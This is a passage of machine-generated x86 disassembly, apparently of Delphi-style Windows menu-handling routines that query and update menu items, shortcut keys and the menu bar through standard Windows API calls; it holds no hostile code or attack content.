call sub_4041ac
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_461f8c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407c98
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f40
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c370
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c370
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
push eax
mov edx esi
mov eax ebx
call sub_45f4e4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_40440c
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407c98
push ebp
mov eax [ ebp - 0x2c ]
call sub_45fe80
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45fe80
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c370
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f84
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45f4e4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_461ef8
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f40
mov edx esi
mov eax ebx
call sub_45f4e4
push eax
mov edx esi
mov eax ebx
call sub_45f4e4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4041ac
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_40440c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45ff34
mov eax [ ebp - 0x18 ]
call sub_4041ac
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_40444c
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404494
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45ff34
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_460590
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45f4d4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45f4d4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_460714
test al al
je r-xdata
mov eax esi
call sub_45f4d4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
call sub_46056c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45f4e4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
call sub_46056c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45f4e4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45f4e4
call sub_46056c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_4606e8
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_4606e8
and eax 0x7f
mov al [ eax + rw-data ]
sub_460714
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_460714
and eax 0x7f
mov al [ eax + rw-data ]
sub_460740
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d428
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_4209c8
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_46146c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4607dc
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403174
mov eax [ esi + 0x44 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420a14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_460850
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_460850
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_45cf94
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45f8d8
mov eax ebx
pop esi
pop ebx
retn
sub_460890
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45f4d4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45f4e4
call sub_460890
pop ecx
test al al
je r-xdata
sub_460928
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_460890
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45cf94
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_460958
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_460928
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_461c7c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_4609c8
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_460928
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_4609e4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_460928
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_460094
mov ebx eax
xor edx edx
mov eax edi
call sub_460590
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45f9fc
mov eax [ esi + 0x34 ]
call sub_45f9fc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_45d938
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_453e1c
push eax
call DrawMenuBar
sub_460ad0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_460ad0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_460bf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_460928
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45f9fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_460ac0
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_460c24
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_429660
xor eax eax
push ebp
push sub_460d22
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_429660
xor eax eax
push ebp
push sub_460cf7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_460ad0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_429658
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460d29
mov eax [ rw-data ]
call sub_429658
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_460928
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_460d48
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_4610cc
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_4610cc
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_460e04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4613a0
mov eax ebx
call sub_4085a0
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_460ea4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_460e04
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_40415c
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4043ac
lea edx [ ebp - 0x200 ]
call sub_408690
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_460f38
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_460fa8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461448
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_461448
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_461448
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_460fb4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_460ea4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_460f38
mov eax ebx
call sub_46146c
jmp r-xdata
sub_46101c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_461064
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_45b294
mov eax ebx
call sub_460878
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_45b2d8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_420a98
sub_4610a0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420ce4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_461064
sub_4610e4
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_460928
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_460928
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_464d50
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_461140
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_461215
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_460928
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_460928
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45f4d4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45f4e4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4040d4
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4040d4
mov eax [ ebp - 0xc ]
pop edx
call sub_407e10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_461f8c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46121c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f10
retn
sub_461228
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4610e4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_461140
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4613a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_460aac
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_460928
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
